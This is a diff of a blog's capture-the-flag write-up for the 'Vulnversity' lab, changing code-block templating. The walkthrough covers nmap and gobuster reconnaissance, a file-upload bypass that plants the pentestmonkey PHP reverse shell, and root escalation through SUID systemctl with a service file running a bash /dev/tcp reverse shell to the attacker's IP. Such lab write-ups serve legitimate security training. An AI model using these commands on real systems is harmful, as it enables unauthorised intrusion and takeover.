@@ -26,10 +26,7 @@ Congratulations on your acceptance to Vulnversity.
 
 The first step is to run nmap to determine the open ports.
 
-{% raw %}
-```bash
-┌──(sec㉿kali)-[~]
-└─$ nmap -sV -sC -A -O -oN nmap 10.10.101.216
+{% capture nmap %}
 ┌──(sec㉿kali)-[~]
 └─$ nmap -sV -sC -A -O -oN nmap 10.10.207.42
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-06 23:06 AEDT
@@ -52,14 +49,17 @@ PORT     STATE SERVICE     VERSION
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 |_http-title: Vuln University
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=nmap %}
 
 <br />
 Run gobuster to try and brute-force directories.
 
-{% raw %}
-```bash
+{% capture gobuster %}
 ┌──(sec㉿kali)-[~]
 └─$ gobuster dir -u http://10.10.207.42:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster
 ===============================================================
@@ -87,8 +87,12 @@ Progress: 3706 / 220561 (1.68%)
 ===============================================================
 Finished
 ===============================================================
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=gobuster %}
 
 <br />
 Navigate to the /internal/ directory and notice the file upload.
@@ -111,17 +115,23 @@ Notice that there is some sort of file extension restriction in place that will 
 <br />
 Create a phpext.txt file with the possible php extensions that will be tested.
 
-{% raw %}
-```bash
+{% capture catphp %}
 ┌──(sec㉿kali)-[~]
-└─$ cat phpext.txt  
+└─$ cat phpext.txt
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=catphp %}
+
+{% include codebox.html title="phpext.txt" content="
 .php
 .php3
 .php4
 .php5
 .phtml
-```
-{% endraw %}
+" %}
 
 <br />
 Push the traffic through Burp Suite and run the upload to generate the request.
@@ -207,8 +217,7 @@ Review the response and notice that it says Success.
 <br />
 Download the <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php">pentestmonkey reverse shell</a>.
 
-{% raw %}
-```bash
+{% capture downloadptm %}
 ┌──(sec㉿kali)-[~]
 └─$  wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php -O shell.phtml
 --2025-01-06 23:39:45--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
@@ -221,14 +230,17 @@ Saving to: ‘shell.phtml’
 shell.phtml                                                100%[========================================================================================================================================>]   5.36K  --.-KB/s    in 0s      
 
 2025-01-06 23:39:45 (48.2 MB/s) - ‘shell.phtml’ saved [5491/5491]
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=downloadptm %}
 
 <br />
 Edit the shell to update the IP address and the port for whatever you intend to use on your attack machine.
 
-{% raw %}
-```php 
+{% capture shellphp %}
 <?php
 // php-reverse-shell - A Reverse Shell implementation in PHP
 // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
@@ -254,20 +266,27 @@ $debug = 0;
 <snip>
 
 ?> 
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="php"
+   title="shell.phtml"
+   content=shellphp %}
 
 <br />
 Start a listener that listens on the port specified in the payload.
 
-{% raw %}
-```bash 
+{% capture footlisten %}
 ┌──(sec㉿kali)-[~]
 └─$ sudo nc -nlvp 443                                   
 [sudo] password for sec: 
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=footlisten %}
 
 <br />
 Choose the shell.phtml file and click the submit button to upload it.
@@ -292,8 +311,7 @@ Navigate to the shell that was just uploaded.
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```bash 
+{% capture catchfoothold %}
 ┌──(sec㉿kali)-[~]
 └─$ sudo nc -nlvp 443                                   
 [sudo] password for sec: 
@@ -305,24 +323,30 @@ USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /bin/sh: 0: can't access tty; job control turned off
 $ 
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=catchfoothold %}
 
 <br />
 Use python pty to spawn a better shell.
 
-{% raw %}
-```bash 
+{% capture pyspawn %}
 $ python -c 'import pty; pty.spawn("/bin/bash");'
 www-data@vulnuniversity:/$ 
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=pyspawn %}
 
 <br />
 Cat the user.txt in the user folder and ifconfig to get the full trophy.
 
-{% raw %}
-```bash 
+{% capture userflag %}
 www-data@vulnuniversity:/$ cat /home/bill/user.txt
 cat /home/bill/user.txt
 <redacted>
@@ -345,14 +369,17 @@ lo        Link encap:Local Loopback
           TX packets:609 errors:0 dropped:0 overruns:0 carrier:0
           collisions:0 txqueuelen:1 
           RX bytes:62408 (62.4 KB)  TX bytes:62408 (62.4 KB)
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=userflag %}
 
 <br />
 Check the <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">G0tmi1k</a> linux privilege escalation blog post to get the commands to get the stick bits.
 
-{% raw %}
-```bash 
+{% capture stickysearch %}
 find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
 find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
 find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
@@ -362,14 +389,17 @@ for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f
 
 # find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
 find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=stickysearch %}
 
 <br />
 Run the command to find the SGID or SUID.
 
-{% raw %}
-```bash 
+{% capture runsuid %}
 www-data@vulnuniversity:/$ find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
 <find / -perm -g=s -o -perm -u=s -type f 2>/dev/null                         
 /usr/local/share/sgml
@@ -430,14 +460,17 @@ www-data@vulnuniversity:/$ find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
 /sbin/unix_chkpwd
 /sbin/pam_extrausers_chkpwd
 /sbin/mount.cifs
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=runsuid %}
 
 <br />
 Review the results and notice the /bin/systemctl in the results list.
 
-{% raw %}
-```bash 
+{% capture systemctl %}
 www-data@vulnuniversity:/$ find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
 <find / -perm -g=s -o -perm -u=s -type f 2>/dev/null                         
 
@@ -446,8 +479,12 @@ www-data@vulnuniversity:/$ find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
 /bin/systemctl
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=systemctl %}
 
 <br />
 Check the <a href="https://gtfobins.github.io/gtfobins/systemctl/">gtfobins</a> for systemctl and notice the entry.
@@ -461,8 +498,7 @@ Check the <a href="https://gtfobins.github.io/gtfobins/systemctl/">gtfobins</a> 
 <br />
 Couldn't get the GTFOBins process to work.  So, back to the Google and found this gist from <a href="https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740">A1vinSmith</a>.  Create the root.service.
 
-{% raw %}
-```bash 
+{% capture createrootservice %}
 www-data@vulnuniversity:/dev/shm$ echo '[Unit]' > root.service
 echo '[Unit]' > root.service
 www-data@vulnuniversity:/dev/shm$ echo 'Description=roooooooooot' >> root.service
@@ -484,6 +520,14 @@ www-data@vulnuniversity:/dev/shm$ echo 'WantedBy=multi-user.target' >> root.serv
 <v/shm$ echo 'WantedBy=multi-user.target' >> root.service                    
 www-data@vulnuniversity:/dev/shm$ cat root.service
 cat root.service
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=createrootservice %}
+
+{% include codebox.html title="root.service" content="
 [Unit]
 Description=roooooooooot
 
@@ -494,39 +538,43 @@ ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.4.119.29/9999 0>&1'
 
 [Install]
 WantedBy=multi-user.target
-```
-{% endraw %}
+" %}
 
 <br />
 Start a listener that listens on port 9999.
 
-{% raw %}
-```bash 
+{% capture startrootlistener %}
 ┌──(sec㉿kali)-[~]
 └─$ nc -nlvp 9999                                       
 listening on [any] 9999 ...
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=startrootlistener %}
 
 <br />
 Use systemctl to enable and start the new root.service.
 
-{% raw %}
-```bash 
+{% capture startservice %}
 www-data@vulnuniversity:/dev/shm$ /bin/systemctl enable /dev/shm/root.service
 /bin/systemctl enable /dev/shm/root.service
 Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /dev/shm/root.service.
 Created symlink from /etc/systemd/system/root.service to /dev/shm/root.service.
 www-data@vulnuniversity:/dev/shm$ /bin/systemctl start root  
 /bin/systemctl start root
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=startservice %}
 
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```bash 
+{% capture catchrootshell %}
 ┌──(sec㉿kali)-[~]
 └─$ nc -nlvp 9999                                       
 listening on [any] 9999 ...
@@ -534,14 +582,17 @@ connect to [10.4.119.29] from (UNKNOWN) [10.10.207.42] 42488
 bash: cannot set terminal process group (2059): Inappropriate ioctl for device
 bash: no job control in this shell
 root@vulnuniversity:/#
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=catchrootshell %}
 
 <br />
 Get the root.txt flag.txt.  Run ifconfig to complete the trophy.
 
-{% raw %}
-```bash 
+{% capture rootflag %}
 root@vulnuniversity:/# cat /root/root.txt
 cat /root/root.txt
 <redacted>
@@ -564,8 +615,12 @@ lo        Link encap:Local Loopback
           TX packets:751 errors:0 dropped:0 overruns:0 carrier:0
           collisions:0 txqueuelen:1 
           RX bytes:69416 (69.4 KB)  TX bytes:69416 (69.4 KB)
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=rootflag %}
 
 <br />
 Hope you enjoyed the box.  Feel free to check out one of my other write-ups.
